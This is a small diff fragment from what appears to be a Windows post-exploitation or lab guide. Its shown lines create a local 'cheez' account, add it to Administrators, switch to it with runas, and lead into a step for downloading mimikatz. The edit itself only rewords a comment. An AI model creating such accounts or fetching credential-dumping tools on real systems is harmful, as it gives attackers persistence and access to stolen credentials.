@@ -107,7 +107,7 @@ Add to cheez.ps1
 New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String '****' -Force)
 Add-LocalGroupMember -Group "Administrators" -Member "cheez"
 
-#Logon as cheez (Exeute below as cheez)
+#Logon as cheez (Exeute steps after this as cheez)
 runas /user:cheez powershell.exe
 
 #Download mimikatz
